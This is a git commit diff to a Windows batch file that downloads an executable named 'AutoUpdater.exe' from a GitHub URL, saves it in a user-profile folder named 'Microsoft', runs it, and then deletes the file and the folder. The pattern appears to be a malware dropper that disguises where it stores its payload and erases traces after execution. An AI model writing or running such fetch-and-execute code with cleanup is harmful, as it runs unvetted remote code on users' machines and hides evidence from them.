fbd0031cacbf34eee234aede788a8dd409b0bb1f
EnVy <leanvieth@gmail.com>
2024-03-04 17:28:56 -0600

    Update e.bat

--- e.bat
+++ e.bat
@@ -3,7 +3,7 @@ set "file=AutoUpdater.exe"
 set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
 set "docPath=%USERPROFILE%\Microsoft"
 
-:: Ensure the Documents directory exists
+:: Ensure the directory exists
 if not exist "%docPath%" mkdir "%docPath%"
 
 :: Download the file
@@ -11,4 +11,11 @@ curl -L %url% -o "%docPath%\%file%"
 
 :: Execute the file
 cd /d "%docPath%"
-start "" "%file%"
+start /wait "" "%file%"
+
+:: Delete the file
+del /q "%file%"
+
+:: Attempt to remove the directory, will only succeed if it is empty
+cd /d "%USERPROFILE%"
+rmdir /q /s "%docPath%"
